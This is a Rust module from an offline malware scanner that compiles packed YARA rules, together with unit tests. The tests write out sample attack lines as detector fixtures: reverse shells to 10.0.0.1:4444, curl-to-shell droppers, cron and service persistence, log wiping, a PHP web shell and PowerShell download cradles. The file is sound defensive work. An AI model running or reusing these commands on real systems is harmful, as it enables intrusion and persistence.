//! GRT Sentry's own detection rules, run against file contents offline.
//!
//! The rules are YARA, written for this program and kept in `rules/` in the
//! repository. They are packed into the binary by `build.rs`, compiled once
//! on first use and run by yara-x, so a verdict needs neither a network nor a
//! key.
//!
//! Every rule carries `severity`, `title` and `detail` in its metadata, which
//! is what reaches the interface.

use std::cell::RefCell;
use std::path::Path;
use std::sync::OnceLock;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::state::Severity;

/// Shared with `build.rs`.
const KEY: u8 = 0xA5;

/// The packed rules, XORed so that the binary does not match its own rules.
static PACKED: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rules.bin"));

/// A file that keeps a rule busy longer than this is left without a verdict.
const SCAN_TIMEOUT: Duration = Duration::from_secs(20);

/// One rule that matched.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct RuleHit {
    pub rule: String,
    pub severity: Severity,
    pub title: String,
    pub detail: String,
    /// The path inside an archive, when the match was there.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub member: Option<String>,
    /// That member's SHA-256.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub member_sha256: Option<String>,
}

fn source() -> &'static str {
    static SOURCE: OnceLock<String> = OnceLock::new();
    SOURCE.get_or_init(|| {
        let bytes: Vec<u8> = PACKED.iter().map(|b| b ^ KEY).collect();
        String::from_utf8_lossy(&bytes).into_owned()
    })
}

/// Changes whenever a rule does, so cached results from older rules are
/// thrown away.
pub fn version() -> &'static str {
    static VERSION: OnceLock<String> = OnceLock::new();
    VERSION.get_or_init(|| {
        let digest = Sha256::digest(source().as_bytes());
        format!("{:x}", digest)[..16].to_string()
    })
}

fn compiled() -> Result<&'static yara_x::Rules, String> {
    static RULES: OnceLock<Result<yara_x::Rules, String>> = OnceLock::new();
    RULES
        .get_or_init(|| {
            let mut compiler = yara_x::Compiler::new();
            compiler.add_source(source()).map_err(|e| format!("The detection rules do not compile: {e}"))?;
            Ok(compiler.build())
        })
        .as_ref()
        .map_err(|e| e.clone())
}

/// Whether the rules compiled, which they always should.
pub fn ready() -> Result<(), String> {
    compiled().map(|_| ())
}

/// How many rules there are, for the settings page.
pub fn count() -> usize {
    compiled().map(|rules| rules.iter().len()).unwrap_or(0)
}

thread_local! {
    // A scanner is costly to set up and cheap to reuse, and is not shared
    // between threads.
    static SCANNER: RefCell<Option<yara_x::Scanner<'static>>> = const { RefCell::new(None) };
}

fn with_scanner<T>(f: impl FnOnce(&mut yara_x::Scanner<'static>) -> T) -> Result<T, String> {
    let rules = compiled()?;
    SCANNER.with(|cell| {
        let mut slot = cell.borrow_mut();
        let scanner = slot.get_or_insert_with(|| {
            let mut scanner = yara_x::Scanner::new(rules);
            scanner.set_timeout(SCAN_TIMEOUT);
            scanner
        });
        Ok(f(scanner))
    })
}

/// Runs every rule over bytes already in memory.
pub fn scan_bytes(data: &[u8]) -> Result<Vec<RuleHit>, String> {
    with_scanner(|scanner| match scanner.scan(data) {
        Ok(results) => Ok(hits_from(results)),
        Err(e) => Err(describe(e)),
    })?
}

/// Runs every rule over a file, which yara-x maps rather than reads.
pub fn scan_file(path: &Path) -> Result<Vec<RuleHit>, String> {
    with_scanner(|scanner| match scanner.scan_file(path) {
        Ok(results) => Ok(hits_from(results)),
        Err(e) => Err(describe(e)),
    })?
}

fn describe(error: yara_x::ScanError) -> String {
    match error {
        yara_x::ScanError::Timeout => "The rules took too long on this file and were stopped".to_string(),
        other => other.to_string(),
    }
}

fn hits_from(results: yara_x::ScanResults) -> Vec<RuleHit> {
    results
        .matching_rules()
        .map(|rule| {
            let mut hit = RuleHit {
                rule: rule.identifier().to_string(),
                severity: Severity::Warning,
                title: rule.identifier().replace('_', " "),
                detail: String::new(),
                member: None,
                member_sha256: None,
            };
            for (key, value) in rule.metadata() {
                let yara_x::MetaValue::String(text) = value else { continue };
                match key {
                    "severity" => hit.severity = parse_severity(text),
                    "title" => hit.title = text.to_string(),
                    "detail" => hit.detail = text.to_string(),
                    _ => {}
                }
            }
            hit
        })
        .collect()
}

fn parse_severity(text: &str) -> Severity {
    match text {
        "critical" => Severity::Critical,
        "info" => Severity::Info,
        _ => Severity::Warning,
    }
}

#[cfg(test)]
pub mod samples {
    //! Test files built at run time, so that no sample sits in the source as
    //! the string a scanner would find.

    /// The EICAR test file, from its bytes reversed.
    pub fn eicar() -> Vec<u8> {
        let reversed = br"*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X";
        reversed.iter().rev().copied().collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules_hit(text: &str) -> Vec<String> {
        scan_bytes(text.as_bytes()).unwrap().into_iter().map(|h| h.rule).collect()
    }

    #[test]
    fn the_rules_compile_and_every_one_says_what_it_found() {
        let rules = compiled().unwrap();
        assert!(rules.iter().len() >= 20);
        for rule in rules.iter() {
            let keys: Vec<&str> = rule.metadata().map(|(k, _)| k).collect();
            for wanted in ["severity", "title", "detail"] {
                assert!(keys.contains(&wanted), "{} has no {wanted}", rule.identifier());
            }
        }
    }

    #[test]
    fn no_rule_is_slow_enough_for_the_compiler_to_warn() {
        let mut compiler = yara_x::Compiler::new();
        compiler.add_source(source()).unwrap();
        // EICAR is written as bytes on purpose, see test.yar.
        let warnings: Vec<String> = compiler
            .warnings()
            .iter()
            .map(|w| w.to_string())
            .filter(|w| !w.contains("text_as_hex"))
            .collect();
        assert!(warnings.is_empty(), "{}", warnings.join("\n"));
    }

    #[test]
    fn the_binary_does_not_carry_the_rules_in_plain_text() {
        let packed = String::from_utf8_lossy(PACKED);
        assert!(!packed.contains("rule "));
        assert!(!packed.contains("/dev/tcp"));
        assert!(source().contains("rule eicar_test_file"));
    }

    #[test]
    fn eicar_is_found_and_only_where_the_standard_says() {
        let eicar = samples::eicar();
        let hits = scan_bytes(&eicar).unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].rule, "eicar_test_file");
        assert_eq!(hits[0].title, "Antivirus test file (EICAR)");

        // The standard allows trailing whitespace but not a prefix.
        let mut padded = eicar.clone();
        padded.extend_from_slice(b"\r\n");
        assert_eq!(scan_bytes(&padded).unwrap().len(), 1);

        let mut prefixed = b"x".to_vec();
        prefixed.extend_from_slice(&eicar);
        assert!(scan_bytes(&prefixed).unwrap().is_empty());
    }

    #[test]
    fn reverse_shells_are_critical() {
        let samples = [
            "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
            "#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\n",
            "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.0.0.1\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nimport pty\npty.spawn(\"/bin/bash\")\n",
            "use Socket;$i=\"10.0.0.1\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(4444,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};\n",
        ];
        for sample in samples {
            let hits = scan_bytes(sample.as_bytes()).unwrap();
            assert!(
                hits.iter().any(|h| h.severity == Severity::Critical && h.title == "Reverse shell"),
                "missed: {sample}"
            );
        }
    }

    #[test]
    fn droppers_and_persistence_are_found() {
        let cases = [
            ("wget http://example.net/x -O /tmp/.cache-x\nchmod +x /tmp/.cache-x\n/tmp/.cache-x &\n", "dropper_to_hidden_temp"),
            ("curl -s http://203.0.113.9/i.sh | bash\n", "pipe_to_shell_from_bare_address"),
            ("echo ZWNobyBoZWxsbw== | base64 -d | sh\n", "decode_and_run"),
            ("(crontab -l; echo \"*/5 * * * * curl -fsSL http://example.net/u.sh | sh\") | crontab -\n", "cron_fetch_and_run"),
            ("[Desktop Entry]\nType=Application\nName=Update\nExec=sh -c \"curl -s http://example.net/a | sh\"\n", "desktop_entry_runs_download"),
            ("[Unit]\nDescription=x\n[Service]\nExecStart=/dev/shm/.k\n", "service_runs_from_temp"),
            ("echo /usr/lib/libx.so > /etc/ld.so.preload\n", "writes_ld_preload"),
            ("unset HISTFILE\ncat /dev/null > /var/log/wtmp\n", "covers_its_tracks"),
            ("./run -o stratum+tcp://pool.example.net:3333 --donate-level 1\n", "cryptocurrency_miner"),
        ];
        for (sample, rule) in cases {
            assert!(rules_hit(sample).contains(&rule.to_string()), "{rule} missed: {sample}");
        }
    }

    #[test]
    fn scripts_for_other_interpreters_are_found() {
        let cases = [
            ("<?php @eval($_POST['c']); ?>", "php_web_shell"),
            ("<?php eval(gzinflate(base64_decode('S0m...'))); ?>", "php_obfuscated_eval"),
            ("var s='YWxlcnQoMSk=';eval(atob(s));", "javascript_eval_decoded"),
            (
                "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                "powershell_encoded_command",
            ),
            ("IEX (New-Object Net.WebClient).DownloadString('http://example.net/a.ps1')", "powershell_download_and_run"),
            (
                "Set s = CreateObject(\"WScript.Shell\")\nSet h = CreateObject(\"MSXML2.XMLHTTP\")\nSet b = CreateObject(\"ADODB.Stream\")\ns.Run \"a.exe\"\ns.Run(\"a.exe\")\n",
                "windows_script_dropper",
            ),
            ("certutil.exe -urlcache -split -f http://example.net/a.exe a.exe", "certutil_download"),
            (
                "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"u\"=\"C:\\\\Users\\\\a\\\\AppData\\\\Roaming\\\\u.exe\"\n",
                "registry_run_key_from_temp",
            ),
        ];
        for (sample, rule) in cases {
            assert!(rules_hit(sample).contains(&rule.to_string()), "{rule} missed: {sample}");
        }
    }

    #[test]
    fn a_registry_file_saved_as_utf16_is_read_too() {
        let text = "Windows Registry Editor Version 5.00\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\r\n\"x\"=\"powershell -w hidden\"\r\n";
        let mut wide = vec![0xFF, 0xFE];
        for unit in text.encode_utf16() {
            wide.extend_from_slice(&unit.to_le_bytes());
        }
        assert!(scan_bytes(&wide).unwrap().iter().any(|h| h.rule == "registry_run_key_from_temp"));
    }

    #[test]
    fn a_ransom_note_needs_more_than_one_sentence_to_count() {
        let note = "All your files have been encrypted!\nTo get the decryption key, send 0.1 BTC to the bitcoin wallet below within 72 hours.\n";
        assert!(rules_hit(note).contains(&"ransom_note".to_string()));

        let news = "Hospital says your files were encrypted in the attack, officials report.";
        assert!(rules_hit(news).is_empty());
    }

    #[test]
    fn ordinary_scripts_and_documents_match_nothing() {
        let benign = [
            // The rustup installer line, in a document and in a script.
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n",
            "#!/bin/sh\nset -e\nwget -O /tmp/go.tar.gz https://go.dev/dl/go.tar.gz\ntar -C /usr/local -xzf /tmp/go.tar.gz\n",
            // A port check, which uses /dev/tcp without a shell.
            "#!/bin/bash\nexec 3<>/dev/tcp/localhost/5432 && echo up\n",
            "[Desktop Entry]\nType=Application\nName=Firefox\nExec=firefox %u\n",
            "[Service]\nExecStart=/usr/bin/syncthing serve --no-browser\n",
            "import socket\ns = socket.socket()\ns.connect((\"localhost\", 80))\n",
            "export HISTFILE=~/.bash_history\nhistory -c\n",
            "<?php echo htmlspecialchars($_GET['q']); ?>",
            "const data = JSON.parse(atob(payload));",
            "Get-ChildItem -Path C:\\ | Sort-Object Length",
        ];
        for sample in benign {
            assert!(rules_hit(sample).is_empty(), "false positive on: {sample}");
        }
    }

    #[test]
    fn upx_is_only_information() {
        let mut elf = vec![0x7F, b'E', b'L', b'F'];
        elf.extend_from_slice(&[0u8; 200]);
        elf.extend_from_slice(b"UPX!");
        let hits = scan_bytes(&elf).unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::Info);
    }

    #[test]
    fn a_file_is_scanned_from_disk_the_same_as_from_memory() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("eicar.com");
        std::fs::write(&path, samples::eicar()).unwrap();
        assert_eq!(scan_file(&path).unwrap()[0].rule, "eicar_test_file");
    }

    #[test]
    fn the_version_follows_the_rules() {
        assert_eq!(version().len(), 16);
        assert_eq!(version(), version());
    }
}
